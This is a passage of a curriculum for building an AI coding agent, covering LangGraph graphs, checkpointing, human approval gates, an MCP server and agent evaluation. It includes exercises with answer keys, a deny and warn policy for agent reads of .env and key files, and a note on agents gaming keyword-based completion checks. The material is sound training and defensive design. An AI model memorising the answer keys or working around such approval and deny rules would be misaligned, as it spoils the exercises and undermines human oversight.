state (checkpointing persists it; the conditional edge could one day check `steps >= max_steps`).

**Expected key:** (1) `agent → tools → agent → tools → agent → END` for a 2-tool run; (2) `END`;
(3) observations must always return to the reasoner; (4) error → ToolMessage content.

**Level 2 — Applied** (DevMate, 1–3 h)
Implement the real graph at the roadmap's designated path:
`projects/04-ai-engineering/devmate/src/devmate/agent/graph.py`. Requirements: (1) `AgentState`
TypedDict (`messages: list`, `goal: str`, `steps: int`); (2) `agent_node` — calls `llm_client`
(via the same `_build_system_prompt` from `ReActAgent` or a LangChain message builder — your
choice, keep it dependency-light), increments `steps`; (3) `tool_node` — resolves tool calls
against the `TOOLS` registry from `agent.py`, executes, catches exceptions into `ToolMessage`s
(never crashes the graph); (4) `should_continue` — tool calls present → `"tools"`, else `END`;
(5) compile and expose `get_agent_graph()`. Write `projects/04-ai-engineering/devmate/tests/unit/test_graph.py`:
stub the LLM to emit a 2-tool trajectory then a final answer; assert the full node sequence
(`agent, tools, agent, tools, agent`), final state contains the answer, `steps == 3`, and a
tool-that-raises case produces an error observation *and continues* (the next agent step sees the
error text).

**Acceptance criteria:** graph compiles; tests assert node sequence and error-as-observation; `make
types` and `make lint` clean.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_graph.py -q
poetry run mypy src/devmate/agent/graph.py && poetry run ruff check src/devmate/agent/graph.py
```
Expected: tests pass; mypy/ruff clean.

**Level 3 — Stretch** (production-grade, 3–6 h)
Write the migration ADR — the lecture's ADR-007 made real — into `docs/decisions/` using
`infra/scripts/new-adr.ps1` (e.g., `docs/decisions/0010-handrolled-react-to-langgraph.md`):
Context (audit findings: no persistence, no resume, no approval, no diagram), Decision Drivers
(crash safety, auditability, human-in-the-loop, streaming roadmap), Options Considered — (A) stay
hand-rolled and add persistence manually, (B) LangGraph, (C) another framework (AutoGen/CrewAI) —
with pros/cons each, Decision (B, citing observability and checkpointing per the lecture),
Consequences (dependency weight, learning curve, dual code paths during migration), and revisit
conditions (e.g., "if LangGraph's abstractions leak into tool code — revisit the abstraction").
Your ADR must reference real files (`src/devmate/agent/agent.py` stays as the hand-rolled
reference; `graph.py` is the new home) and state what happens to `LangGraphAgent` in `agent.py`
(it currently falls back to ReAct — the migration supersedes it). Add a `## 3.5 Migration notes`
section to `notes.md` comparing hand-rolled vs graph runs (step counts, code size, failure
behavior) as the roadmap demands ("compare against the hand-rolled version in `notes.md`").

**Verify:** `grep -n "Decision" docs/decisions/0010-handrolled-react-to-langgraph.md` (or your ADR
file) → all template sections present; your ADR names A/B/C with pros/cons and a revisit condition;
`grep -n "3.5 Migration notes" projects/04-ai-engineering/devmate/notes.md` → section exists.

**Common failure modes:**
- Symptom: the graph "runs" but `should_continue` never fires `tools` → Cause: the LLM stub
  returns text, not `tool_calls`, and you skipped the tool-call parsing bridge → Fix: in
  `agent_node`, parse the model response into `tool_calls` (reuse the 3.4a parser or a bridge
  function) — the graph needs *structured* tool calls from the agent node.
- Symptom: exception in `tool_node` kills the whole graph → Cause: no try/except around
  `tool.invoke` → Fix: error → `ToolMessage` (the tool-that-raises test locks this).
- Symptom: `steps` never increments → Cause: state updates are returned but the reducer replaces
  the field → Fix: LangGraph merges state dicts shallowly — return `{"steps": state["steps"] + 1}`
  explicitly from `agent_node`.

**Interview:** *"When is a hand-rolled agent loop not good enough?"*
A strong answer: when state must survive crashes (persistence), when runs must resume
(checkpointing), when approval must be a first-class flow (human-in-the-loop), and when the team
must *show* the control flow to auditors (graph = diagram). The hand-rolled loop is still the
best *teaching* and *debugging* surface — which is why DevMate keeps both and compares them in
`notes.md`. Name the migration trigger: first requirement for resume or approval ⇒ migrate.

### Topic 3.5b — Checkpointing: SqliteSaver, thread_id, Resume

**Mastery =** you can persist agent state, resume a run from a checkpoint, and explain thread
isolation.

**Level 1 — Drill** (mechanics, 20–45 min)
Given the lecture's snippet (`checkpointer = SqliteSaver.from_conn_string("sqlite:///agent_checkpoints.db")`,
`config = {"configurable": {"thread_id": "session-123"}}`), answer on paper: (1) what exactly is
saved at each step? (the full graph state: `messages`, `goal`, `steps` — not just the answer); (2)
if a run crashes after step 3 and you re-invoke with the same `thread_id`, what does the graph do?
(resumes from the checkpoint — step 4 onward — instead of restarting); (3) two concurrent runs with
`thread_id` "a" and "b" — do they interfere? (no — thread_id is the isolation key; each has its own
state timeline); (4) what is the crash-window cost saving for DevMate? (a 3.2-economics answer: the
$412 incident's per-step cost × steps lost — resuming after step 3 instead of restarting saves
steps 1–3's tokens every time).

**Expected key:** as above. Also write the one-line rule: *thread_id = conversation identity,
checkpointer = persistence layer, invoke = resume-or-start*.

**Level 2 — Applied** (DevMate, 1–3 h)
Add checkpointing to `graph.py`: (1) `SqliteSaver.from_conn_string("sqlite:///agent_checkpoints.db")`
in a module-level `get_checkpointer()` (DB file at `projects/04-ai-engineering/devmate/agent_checkpoints.db` —
add it to `.gitignore`); (2) `get_agent_graph()` compiles with the checkpointer; (3) integration
test `projects/04-ai-engineering/devmate/tests/integration/test_checkpointing.py` (mark
`integration`, no infra needed — SQLite is local): run a stubbed trajectory to step 2, then
*simulate a crash* (raise inside the tool at step 3 via a stub), assert the exception propagates;
then re-invoke with the same `thread_id` and a fixed stub that completes → assert the final state
`steps` reflects the full path and `messages` contain the pre-crash history (the agent "remembers"
steps 1–2 — resume, not restart). Also test thread isolation: run thread "a" to step 1, thread "b"
to step 2, assert each state is independent.

**Acceptance criteria:** ≥ 2 tests; resume is proven by state content, not just "no crash";
`make test-int` on this file passes with `make up` running (the marker requires infra per the
Makefile's `-m integration`).

**Verify:**
```bash
make up
cd projects/04-ai-engineering/devmate && poetry run pytest -q -m integration tests/integration/test_checkpointing.py
```
Expected: `2 passed`; `agent_checkpoints.db` exists after the run.

**Level 3 — Stretch** (production-grade, 3–6 h)
Checkpoint security and scale, decided ADR-style into `notes.md` (`## 3.5 Checkpoint ADR`):
(1) **sensitive data** — checkpoints contain message content: code snippets, file contents,
possibly secrets from `read_file` of `.env` (a 3.3c deny-list helps, but assume leaks) → options:
encrypt at rest / store only in-memory for dev / restrict DB file permissions → decide; (2)
**retention** — checkpoints grow unbounded (one row per step per thread): options: TTL cleanup /
keep last N threads / no cleanup → decide with a size estimate (rough: 2 KB/step × 10 steps × 100
threads = 2 MB — trivial at first, not trivial at 10k threads); (3) **resume semantics across
processes** — SQLite is single-writer: what happens on concurrent resume of the same thread_id?
(langgraph handles locking, but name the risk); (4) implement the chosen retention/cleanup slice
with a test (e.g., `cleanup_old_checkpoints(days=30)` deleting rows older than N — test against a
temp DB).

**Verify:** unit/integration tests for the cleanup slice pass; `grep -n "3.5 Checkpoint ADR"`
`notes.md`; your ADR names options, decision, consequences, and revisit condition (e.g., "revisit
at 1k threads/day — move to Postgres checkpointer").

**Common failure modes:**
- Symptom: re-invoke with same thread_id "restarts from scratch" → Cause: checkpointer not passed
  to `compile()`, or a new DB path each run → Fix: module-level checkpointer; test asserts state
  content continuity.
- Symptom: `sqlite3.OperationalError: database is locked` → Cause: two processes on the same file
  → Fix: single process per DB in dev; Postgres checkpointer at scale (the revisit condition).
- Symptom: checkpoints leak secrets to disk → Cause: no policy → Fix: L3 decision + `.gitignore`
  (the DB must never reach git — add a check: `git check-ignore agent_checkpoints.db`).

**Interview:** *"What does checkpointing buy you in production, concretely?"*
A strong answer: crash safety (a failed step doesn't burn the whole run), resume (thread_id = pick
up where you left off — the auditor's "continue this review" use case), auditability (every state
is reconstructible), and multi-turn memory across invocations. Then the caveats: storage grows,
sensitive content lands in the DB, SQLite is single-writer — each has a policy answer.

### Topic 3.5c — Human-in-the-Loop: Approval Gates for Consequential Actions

**Mastery =** you can place an interrupt in a graph, distinguish consequential from benign actions,
and record the decision.

**Level 1 — Drill** (mechanics, 20–45 min)
On paper, insert the approval gate for DevMate. Given the graph `agent ⇄ tools`, the rule:
`propose_patch` is consequential → requires approval; `search_code`, `read_file`, `run_tests` are
benign. (1) Where does the graph interrupt? (between `tools` and `agent`, after a `propose_patch`
result — the tool ran *propose-only*, so nothing is written yet, but the *next* step must be
gated); (2) draw the modified graph: add node `approve` with edges `tools → approve → agent` when
the last tool was `propose_patch`, else `tools → agent`; (3) what does the human see? (the diff +
description from the tool result); (4) what happens on reject? (a message is injected as an
observation — `"Patch rejected by user: {reason}"` — and the agent continues or finalizes); (5)
why must the gate sit *after* the tool, not before? (you can't approve a diff you haven't seen —
and the tool itself never writes, so "after" is still before any side effect).

**Expected key:** as above; the principle: approval gates protect *side effects*, and DevMate's
patch tool has no side effects until `apply` — so the gate guards the *apply* step (3.3e), and in
the graph it gates continuation toward apply-like actions.

**Level 2 — Applied** (DevMate, 1–3 h)
Implement the gate in `graph.py` using LangGraph's `interrupt` (or an equivalent manual gate if
your LangGraph version differs): in `tool_node`, after a `propose_patch` result, call
`interrupt({"proposed_patch": result.content})`; the graph pauses and returns control. The resume
path (`Command(resume=...)`) injects `{"approved": bool, "reason": str}` as a `ToolMessage`; the
agent's next `agent_node` sees it and either finalizes ("patch proposed, awaiting apply") or
continues. Tests in `tests/unit/test_graph.py`: (1) benign trajectory never interrupts; (2)
propose_patch trajectory pauses with the diff in the interrupt payload; (3) resume with approve →
the injected observation appears in `messages`; (4) resume with reject → the rejection text
appears and no `apply` was attempted (assert via a stub `apply` recorder). If your installed
LangGraph lacks `interrupt`, implement the gate as a manual state field (`needs_approval`) plus a
test that the graph stops when it is set — and note the difference in `notes.md`.

**Acceptance criteria:** ≥ 4 tests; the gate is proven for approve and reject paths; no test
applies a real patch.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_graph.py -q
```
Expected: ≥ 4 graph tests pass (existing + new).

**Level 3 — Stretch** (production-grade, 3–6 h)
The **approval policy matrix** — decide what needs approval, not just how to gate it. Write into
`notes.md` (`## 3.5 Approval policy`): for each tool × context, classify: always benign / benign
with conditions / consequential. Use a policy table — e.g., `search_code` always benign;
`read_file` benign except deny-listed paths (`.env`, keys) → *warn*; `run_tests` benign except
args containing `--pdb` (stdin block) → *deny*; `propose_patch` always *approve*; hypothetical
`apply_patch` (from 3.3e) always *approve* with recorded approver. Then implement the policy as a
single pure function `approval_policy(tool_name, action_input) -> "allow" | "warn" | "deny" |
"approve"` in `graph.py` (or `agent.py`), with unit tests for ≥ 6 matrix cells. Write the ADR-style
justification: deny-by-default for anything touching secrets or writes, warn-by-default for reads,
and why `propose_patch` alone among the current 4 tools gets a hard gate (it is the only
side-effect-adjacent tool — its output is the seed of a write). Revisit conditions: adding a 5th
tool must run this matrix first (ties to 3.8e and ADR-009's 4-tool MVP).

**Verify:** `poetry run pytest tests/unit/test_approval_policy.py -q` passes (≥ 6 cells);
`grep -n "3.5 Approval policy" notes.md`; the matrix is complete for all 4 tools + apply_patch.

**Common failure modes:**
- Symptom: interrupt fires on every step (even `search_code`) → Cause: gate placed on the
  `tools → agent` edge unconditionally → Fix: conditional — gate only when the last tool is
  `propose_patch` (test 1 of L2 locks this).
- Symptom: reject path still lets the agent "apply" → Cause: rejection injected as an ordinary
  observation the agent can ignore → Fix: the gate blocks the apply action itself (the agent has no
  apply tool; only the operator path from 3.3e can apply) — defense in depth.
- Symptom: human approves, nothing happens → Cause: resume payload not wired to `agent_node` →
  Fix: assert in test 3 that the approval observation appears in `messages` (the agent must *see*
  the decision).

**Interview:** *"What should require human approval in an agent, and how do you enforce it?"*
A strong answer: approval gates protect *consequential* actions — anything that writes, deletes,
sends, or spends real money — and the definition is a policy matrix, not a vibe. Enforcement is
architectural: the gate sits between the tool result and continuation (interrupt), the tool itself
is side-effect-free (propose-only), and the apply path is operator-only. Record every decision for
the audit log. The one-line rule: *autonomy for reads, approval for writes, deny for secrets*.

---

## 3.6 MCP Server

### Real-world problem

Week 6's differentiator turns into a support saga. The MCP server works perfectly in Claude
Desktop: tools appear, searches run. The customer tries the same config in Cursor: "Server
disconnected" within 2 seconds, every time. Same JSON config, same machine. Meanwhile the
engineering lead asks why the team is building MCP at all — "we already have a REST API, why not
just call it?" The answers: Cursor and Claude Desktop differ in *how they launch stdio servers*
(working directory, environment, inherited vs. clean env, argument handling), and the REST API is
a custom protocol no external tool understands — the entire point of MCP is ecosystem reach (the
lecture's ADR-008: MCP over custom API). **The decision:** build the MCP server properly (correct
lifecycle, tools, schemas), make client configuration reproducible, and write the debugging
runbook *before* the tickets arrive. The roadmap budgets 2 full days — MCP is the differentiator.

### Topic 3.6a — MCP Server: list_tools / call_tool, stdio Transport, inputSchema

**Mastery =** you can read `src/devmate/mcp/server.py`, explain the two handlers and the
transport, and extend the tool list without breaking the protocol.

**Level 1 — Drill** (mechanics, 20–45 min)
Open `projects/04-ai-engineering/devmate/src/devmate/mcp/server.py` and answer: (1) what three
tools does `list_tools` expose, and what is each one's `inputSchema` (properties + required)?
(2) what does `call_tool` return for an *unknown* tool name? (`raise ValueError(f"Unknown tool:
{name}")` — find the line); (3) what happens inside `_search_code` when `query` is empty? (returns
a TextContent `"Error: query is required"` — a graceful *tool-level* error, not a raise); (4)
which two transports exist (`run_stdio` via `stdio_server`, `run_http` via SSE on `/sse` +
`/messages/` at port 8001 default) and which one does Claude Desktop use? (stdio); (5) write the
exact JSON-RPC message a client sends to learn the tool list (`{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}`).

**Expected key:** as above; also note the schema finding: the agent's `search_code` (`agent.py`)
and the MCP `search_code` both declare `top_k` with `"default": 5` — MCP-spec-wise `default` is a
hint, not enforcement; `_search_code` handles it via `arguments.get("top_k", 5)` (find that line
too).

**Level 2 — Applied** (DevMate, 1–3 h)
Make the server runnable and prove the protocol. Two deliverables: (1) add the entrypoint that the
lecture's client config expects: an `if __name__ == "__main__":` block at the bottom of
`src/devmate/mcp/server.py` calling `asyncio.run(run_mcp_stdio())` — today `python -m devmate.mcp.server`
does **nothing** (verified: no `__main__` block exists); (2) prove the stdio protocol with a raw
handshake — pipe two JSON-RPC messages into the process and assert the response shape:
```powershell
'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"test","version":"0"}}}' | python -m devmate.mcp.server
```
then a second message `{"jsonrpc":"2.0","method":"tools/list","id":2}` — assert the reply
contains `"serverInfo"` with `"name":"devmate"` and `tools/list` returns exactly the 3 tool names.
(Note: MCP stdio framing uses newline-delimited JSON for simple clients; if your installed `mcp`
library requires Content-Length headers, use the official MCP Inspector or a tiny Python client —
document which framing your version uses.) Also write the HTTP variant test: start
`run_mcp_http()` in a subprocess (or a test server) and `Invoke-WebRequest http://localhost:8001/sse`
returns 200 with `text/event-stream`.

**Acceptance criteria:** raw stdio exchange yields serverInfo + 3 tools; SSE endpoint responds;
the `__main__` block is committed in `server.py`.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run python -c "import devmate.mcp.server; print('module ok')"
# + the stdio handshake command above, expecting initialize → tools/list responses
```
Expected: module imports; handshake returns serverInfo `devmate` and the 3-tool list; if the
stdio framing differs, your runbook (3.6b) documents the exact working command.

**Level 3 — Stretch** (production-grade, 3–6 h)
The tool-coverage decision (lecture ADR-009 in practice): the MCP server exposes 3 tools
(`search_code`, `read_file`, `get_repo_stats`) while the agent has 4 (`run_tests`,
`propose_patch` missing). Write the ADR-style decision into `notes.md` (`## 3.6 MCP tool surface
ADR`): options — (A) mirror all 4 agent tools over MCP (consistency, but `run_tests` spawns
subprocesses from *client-owned* sessions — a security review must clear that; `propose_patch`
without a client-side approval UI is a write hazard), (B) keep 3 (read-only surface: safe,
differentiator still proven, MCP clients are chat surfaces not CI runners), (C) add `run_tests`
only. Recommend B for the MVP with the roadmap's "4 tools max" reasoning, then implement one
improvement of your choice with a test: e.g., add a `repo_stats` cache (TTL 60 s — `get_repo_stats`
hits `vs.count()` every call) or add input validation mirroring 3.3a (reject missing `query` with
the existing graceful error). Verify the cache: two consecutive `get_repo_stats` calls → second
served from cache (assert via a counting stub of `get_vector_store`).

**Verify:** unit test for your improvement passes; `grep -n "3.6 MCP tool surface ADR" notes.md`;
your ADR names options A/B/C, chosen path, consequences (MCP is a demo/product surface, the agent
is the automation surface — they are allowed to diverge), revisit condition (when a client UI
gains approval widgets).

**Common failure modes:**
- Symptom: `python -m devmate.mcp.server` exits instantly with no output → Cause: no `__main__`
  block (the verified gap) or an import error swallowed by the client → Fix: L2 entrypoint; run the
  module directly to see stderr.
- Symptom: tools/list returns an empty array in one client but not another → Cause: schema error
  the strict client rejects (e.g., `"default"` without a type hint — some clients validate)
  → Fix: test the schema against the MCP spec (json-schema) before blaming the client.
- Symptom: unknown tool name raises `ValueError` and the *client* shows a cryptic error → Cause:
  `call_tool` raises by design (server.py) → Fix: acceptable per protocol (a raised error is a
  proper JSON-RPC error), but document it in the runbook — the model sees the error text.

**Interview:** *"What is MCP, and why would you expose DevMate through it instead of your own API?"*
A strong answer: MCP is a *standard transport + tool discovery protocol* (initialize, tools/list,
tools/call over stdio or SSE) that makes any MCP client — Claude Desktop, Cursor, IDEs — able to
use DevMate's tools without writing integration code per client. Your own API forces every client
to learn your protocol; MCP makes DevMate *one config block away* in any compatible tool. The
trade-off: you lose control of the UX (client decides how tools are shown) and you must hold the
protocol version line — the reason the roadmap calls MCP the differentiator.

### Topic 3.6b — MCP Client Configuration: Claude Desktop / Cursor, Debugging Connections

**Mastery =** you can configure any MCP client, predict the failure class from the symptom, and
diagnose a broken connection in under 15 minutes.

**Level 1 — Drill** (mechanics, 20–45 min)
Four config snippets, each with an error. Spot and fix each (write the corrected JSON):

| # | Config (abridged) | Error |
|---|-------------------|-------|
| 1 | `{"mcpServers": {"devmate": {"command": "python", "args": ["-m", "devmate.mcp.server"]}}}` — no `cwd`, run from a random directory | `devmate` not importable → server exits on init; fix: add `"cwd": "K:\\learning\\technical\\ai-ml\\01-main-projects\\fullstack-ai-engineer-lab\\projects\\04-ai-engineering\\devmate"` (the lecture's config has `cwd` for this reason) |
| 2 | `"args": "-m devmate.mcp.server"` (a string, not array) | client passes one argv element with spaces → module lookup fails; fix: array `["-m", "devmate.mcp.server"]` |
| 3 | `"command": "poetry"` with `"args": ["run", "python", "-m", "devmate.mcp.server"]` — no absolute poetry path | client launches with a clean PATH (Cursor on macOS/Windows GUI launches often lack the shell PATH) → "command not found"; fix: absolute path to poetry/python |
| 4 | Two servers both named `"devmate"` in different config files | name collision — the second silently wins or both fail; fix: unique names per server |

**Expected key:** as above — the four failure classes: missing cwd (import), wrong args shape
(argv), clean-PATH launch (binary lookup), name collision (registry). Write the *correct* full
Claude Desktop config for DevMate as your drill output (command + args + cwd per the lecture).

**Level 2 — Applied** (DevMate, 1–3 h)
Prove the server from a **real MCP client**, not just raw pipes. If you have Claude Desktop or
Cursor installed: add the config from Level 1, and verify tools appear (screenshot/log the tool
list — `search_code`, `read_file`, `get_repo_stats`). If you do not have a desktop client (likely
in this lab): write a scripted client using the official Python SDK —
`projects/04-ai-engineering/devmate/tests/integration/test_mcp_client.py` (marked `integration`) —
that spawns `python -m devmate.mcp.server` as a subprocess (or uses `mcp.client.stdio`)
and performs the full lifecycle: initialize → tools/list (assert 3 tools + schema) → tools/call
`search_code` with `{"query": "authentication middleware"}` against the ingested index (needs
`make up` + ingest from 3.3b) → assert the result text contains a filename; then tools/call with a
missing `query` → assert the graceful error text; then tools/call `nope` → assert the error is
reported (not a client crash).

**Acceptance criteria:** the client test proves the *full lifecycle* against the real server; it is
integration-marked; results recorded in `notes.md` (`## 3.6 Client verification`) with the date and
client used.

**Verify:**
```bash
make up; make cli ARGS="ingest ."
cd projects/04-ai-engineering/devmate && poetry run pytest -q -m integration tests/integration/test_mcp_client.py
```
Expected: `3 passed` (lifecycle, graceful error, unknown tool). If the installed MCP SDK version
changes the client API, document the working call sequence in `notes.md` — the *behavior* assertions
are the deliverable.

**Level 3 — Stretch** (production-grade, 3–6 h)
Write the **MCP debugging runbook** — the deliverable that would have killed the "works in Claude
Desktop, fails in Cursor" ticket in 15 minutes: `projects/04-ai-engineering/devmate/docs/mcp-debugging.md`.
Contents, all with concrete commands: (1) symptom table — `Server disconnected` immediately /
tools don't appear / tool calls time out / "command not found" / init hangs — each with cause
class (launch env, cwd, PATH, name collision, stdio framing, version mismatch) and fix; (2) the
raw-stdio handshake from 3.6a as the *first* diagnostic (isolates server from client); (3) stderr
capture: run the command manually in a terminal and read the traceback (the client hides stderr);
(4) env check: `Get-Command python` vs the client's launch env (GUI apps often don't inherit
PowerShell PATH — use absolute paths); (5) version pinning: record the `mcp` library version that
works (`poetry show mcp`) — protocol-version mismatch is a classic "works in A, fails in B";
(6) the "Cursor vs Claude Desktop" section: differences in how each launches stdio (cwd
inheritance, env cleaning, arg quoting on Windows). Then validate the runbook by *breaking* your
own server in 3 ways (wrong cwd, string args, missing env var) and confirming each appears in your
symptom table with the fix that actually works.

**Verify:** `grep -c "symptom\|fix\|cursor\|Cursor" projects/04-ai-engineering/devmate/docs/mcp-debugging.md`
→ ≥ 10 matches; your three induced failures each map to a table row you tested; `notes.md` gains
the version pin from `poetry show mcp`.

**Common failure modes:**
- Symptom: works in Claude Desktop, dies in Cursor → Cause: launch-environment difference (cwd /
  PATH / env cleaning) — not the server → Fix: runbook section 6; absolute command path + explicit
  cwd in *both* configs.
- Symptom: "Server disconnected" immediately after tools appear → Cause: the server crashed on the
  first real call (e.g., Qdrant down) and the client labels it disconnect → Fix: read stderr; the
  raw handshake + a manual `tools/call` isolates it.
- Symptom: tools list shows but calls time out → Cause: server blocked on an external call
  (embedding API, Qdrant) → Fix: check `make ps` and API keys — the runbook's "call timeouts" row.
- Symptom: JSON config silently ignored → Cause: wrong file location for the client (Claude
  Desktop: `claude_desktop_config.json`; Cursor: `.cursor/mcp.json` per project) → Fix: runbook
  row documenting per-client locations.

**Interview:** *"An MCP server works in one client but not another. Walk me through your debugging."*
A strong answer: (1) isolate — raw stdio handshake proves or clears the server; (2) read stderr —
the client hides it, run the command manually; (3) compare launch environments — cwd, PATH,
cleaned env (the classic GUI-client difference); (4) check protocol/version pinning; (5) check the
config shape (string vs array args, name collisions). The systematic version of this is a written
runbook — because the third ticket will be identical to the first.

---

## 3.7 Agent Evaluation

### Real-world problem

Demo day. The founder asks the engineer: "How good is the agent?" The honest answer is "we think
it's good". The customer asks: "If I let it touch my CI, how often does it finish the job, how
often does it pick the wrong tool, and can it get stuck?" The pilot's log has 20 recorded goals:
17 finished, 3 didn't — but nobody knows *why* the 3 failed, whether the 17 used the right tools,
or whether any run nearly looped. The lecture's case study sets the targets — completion 85%
(17/20), avg steps 3.2, tool accuracy 92%, zero infinite loops — and the startup needs to *prove*
those numbers, on every change, before the agent touches a customer pipeline. **The decision:**
build the evaluation harness — test cases with expected outcomes, per-run instrumentation, metric
aggregation — and make the metrics a gate, not a dashboard.

### Topic 3.7a — The Metrics: Completion, Tool Accuracy, Steps, Loop Rate, Error Recovery

**Mastery =** you can compute all five metrics from a run log by hand, and you can define each
metric so two engineers cannot disagree on the number.

**Level 1 — Drill** (mechanics, 20–45 min)
Given this run log of 20 goals (columns: goal, completed, steps, first tool choice, correct tool
choice, loop detected, error occurred, recovered), compute the five metrics. Use the following
summary numbers (this is the lecture's case-study data made concrete): 17 completed of 20; steps
per run: `3,4,2,3,5,3,2,4,3,2,3,4,5,3,2,4,3,2,4,3` (sum = 64, avg = 3.2 ✓); first-tool choice
correct in 18 of 20 on the goals where a tool was expected (one goal was out-of-scope — the
correct behavior is *no* tool); 1 run would have looped (identical action+input 6×) and loop
detection stopped it at the 2nd repeat; 10 runs hit a tool error, 7 recovered by changing
approach, 3 failed.

**Expected key:**
- Completion rate = 17/20 = **85%**
- Avg steps = 64/20 = **3.2**
- Tool-selection accuracy = 18/20 = **90%** (count only goals with an expected tool — if you
  exclude the out-of-scope goal from the denominator, it is 18/19 = 94.7% — **state your
  denominator!** metric definitions must be unambiguous)
- Loop detection rate = 1/1 = **100%** (loops detected / loops that occurred)
- Error recovery = 7/10 = **70%**

Then write the *unambiguous definitions*: completion = "agent returned a Final Answer containing
every required fact (checked by keyword list)"; tool accuracy = "first tool call per goal matches
the golden tool"; loop detection rate = "runs where a fingerprint repeat occurred AND the run
stopped with termination_reason == loop_detected, divided by runs where a repeat occurred";
error recovery = "agent continued productively after the error" — a run that errored and then
completed counts; a run that errored and repeated the error does not. Pick that definition and
justify it against the lecture's "% of errors recovered from".

**Level 2 — Applied** (DevMate, 1–3 h)
Instrument the agent for metric collection: extend `ReActAgent.run()` (or the `AgentContext`) so
every completed run appends a JSON record to `projects/04-ai-engineering/devmate/eval/runs/{timestamp}.json`:
`goal`, `completed` (final answer text), `steps` (`context.current_step`), `termination_reason`,
`tool_calls` (ordered list), `first_tool`, `loop_detected`, `tool_errors` (count + first error
text), `cost` (via `cost_tracker` if available). Write `projects/04-ai-engineering/devmate/tests/unit/test_metrics.py`:
a stubbed run (the 3.2a tape) → assert the JSON record has all fields and correct values
(`completed=true`, `steps=3`, `tool_calls=[search_code, read_file, finish]`, `loop_detected=false`).
Deliverable: the record schema + one passing test that the schema is stable.

**Acceptance criteria:** the record file is written on every `run()`; the test asserts the full
schema; the record includes `termination_reason` (3.4b) so eval can compute the loop rate.

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_metrics.py -q
```
Expected: `1 passed`; an `eval/runs/*.json` file exists after the test run.

**Level 3 — Stretch** (production-grade, 3–6 h)
Statistical honesty — the senior problem. The case-study targets come from 20 runs; a 20-run
sample cannot distinguish 80% from 95% completion (with n=20, a single failure is 5% — the
confidence interval is brutal). Write into `notes.md` (`## 3.7 Eval validity`): (1) the CI
problem — LLM nondeterminism means one goal may pass 2/3 times; decide: run each goal 3× and use
the majority? median steps? report a range? (2) the eval-budget problem — each goal run costs
tokens (from 3.2 economics: ~$0.09/run × 20 goals × 3 repeats ≈ $5.40 per full eval; × 20
commits/week = $108/week — decide if that is acceptable or shrink the suite for CI); (3) the
gaming problem — if `completion` is checked by keyword list, a verbose agent that copies the
question into the answer "passes"; decide: semantic completion check (embedding similarity of the
answer to expected facts, threshold e.g. 0.7) vs. strict facts. Implement the **semantic
completion checker** in `devmate/eval/checkers.py` using `embedding_service` (dependency exists)
with a unit test: two answers, one genuinely covering the facts (score above threshold) and one
superficial (below), both with the keywords present — the semantic checker must still separate
them.

**Verify:** `poetry run pytest tests/unit/test_checkers.py -q` passes; `grep -n "3.7 Eval
validity" notes.md`; your written section shows the n=20 math and the chosen repeat/budget policy.

**Common failure modes:**
- Symptom: two engineers report different completion rates → Cause: denominators differ (tool-less
  goals counted or not) → Fix: L1 written definitions; the eval harness hard-codes the rules.
- Symptom: "completion" is 100% because the agent always ends with *some* Final Answer → Cause:
  metric checks "did it end", not "did it answer" → Fix: fact-based completion (keywords or
  semantic); the L3 checker exists for this.
- Symptom: loop rate is "0 loops detected" but the agent spins with rephrased queries → Cause:
  exact-match detection (3.4c) misses semantic loops → Fix: the metric must report *attempted*
  loops too (fingerprint repeats at the intent level), or you undercount by design — say so in the
  definitions.

**Interview:** *"Your agent hits 85% completion. How do I know that number means anything?"*
A strong answer: three things — (1) the metric definition is unambiguous (denominators, fact-based
completion); (2) the sample is honest (n=20 gives a wide interval — report it; run each goal 3×
for stability; budget the eval cost); (3) the harness is a gate, not a dashboard — every agent or
tool change re-runs it, and the number moved *with* the change (tool-description rewrites from 3.3a
should move tool accuracy — that's the signal the eval exists to catch).

### Topic 3.7b — The Evaluation Harness: Test Cases, Expected Outcomes, Aggregation

**Mastery =** you can build a repeatable harness — cases with golden outcomes, a checker, an
aggregator — and read its report.

**Level 1 — Drill** (mechanics, 20–45 min)
Design the harness on paper for the lecture's five test goals. For each goal, write: (1) the
golden first tool, (2) the completion facts (keyword list), (3) the expected max steps (< 5 per
the metric target), (4) whether a loop is a *possible* failure:

| Goal | Golden tool | Completion facts (≥ all present) | Max steps |
|------|-------------|----------------------------------|-----------|
| "Find the authentication middleware and explain how it works" | search_code | contains middleware name (e.g., `auth`, `middleware`) | < 5 |
| "Run tests for the user service and report failures" | run_tests | contains test result markers (`passed`, `failed`, or `error`) | < 5 |
| "Propose a fix for the SQL injection vulnerability in query_builder" | search_code → propose_patch | mentions `query_builder` and the fix (e.g., `parameterized`, `placeholder`) | < 5 |
| "Find all usages of the deprecated `legacy_auth` function" | search_code | `legacy_auth` appears | < 5 |
| "Explain the data flow from API request to database in the order service" | search_code → read_file | mentions request → DB path concepts (`api`, `database`, `order`) | < 5 |

**Expected key:** as above (your keyword lists may differ — the point is the *shape*: golden tool
= deterministic check, facts = substring checks, steps = budget check). Then write the
aggregation formula: completion_rate = passes/total; tool_accuracy = correct_first_tool/total;
avg_steps = mean over completed runs (decide: include failed runs in the mean? — recommend no:
steps-to-completion is only meaningful for completed runs — write that decision down).

**Level 2 — Applied** (DevMate, 1–3 h)
Build the harness: `projects/04-ai-engineering/devmate/eval/cases.json` (the 5 lecture goals with
`{goal, golden_tool, facts[], max_steps}`) and `projects/04-ai-engineering/devmate/eval/run_agent_eval.py`
that: (1) loads cases, (2) runs `ReActAgent` on each (or a `--stub` mode with a scripted LLM for
deterministic runs), (3) checks completion per case with the fact lists, (4) computes the five
metrics from 3.7a, (5) writes a report JSON to `projects/04-ai-engineering/devmate/eval/results/{timestamp}.json`
and prints a markdown table. Run it in `--stub` mode first: feed a tape that completes goals 1–4
and fails goal 5 → assert the report shows completion 4/5 = 80% and steps ≤ 5. Then, if an LLM key
is available, run against the real agent and record the actual numbers in `notes.md`
(`## 3.7 Baseline eval`) with the date.

**Acceptance criteria:** `cases.json` has all 5 lecture goals; the stub run is deterministic and
produces a verifiable report; the report JSON includes all five metrics; baseline numbers (real or
"measured on date X with stub") are recorded.

**Verify:**
```bash
